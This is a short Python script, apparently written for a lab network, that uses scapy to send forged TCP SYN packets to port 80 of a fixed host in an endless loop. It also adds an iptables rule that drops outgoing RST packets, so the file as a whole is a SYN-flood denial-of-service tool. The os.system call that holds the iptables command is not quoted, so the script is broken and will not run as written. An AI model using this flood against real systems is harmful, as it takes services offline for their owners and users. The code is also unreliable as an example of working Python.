import os
from scapy.all import *


def main():
	
	src_ip="192.168.56.101"
	src_mac="08:00:27:DF:17:8C"
	send_syn_packet(src_ip,"192.168.56.102",src_mac,"08:00:27:1A:C1:21")
		
	       


def send_syn_packet(src_ip,dest_ip,src_mac,dest_mac):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=	IP(dst=dest_ip,src=src_ip)
	tcp_h=TCP(flags="S",sport=RandShort(), dport=80, seq=10000)
	pkt=eth_h/ip_h/tcp_h 
	sendp(pkt) 


os.system(iptables -I OUTPUT -p TCP --tcp-flags ALL RST -j DROP) 
while 1:
	main()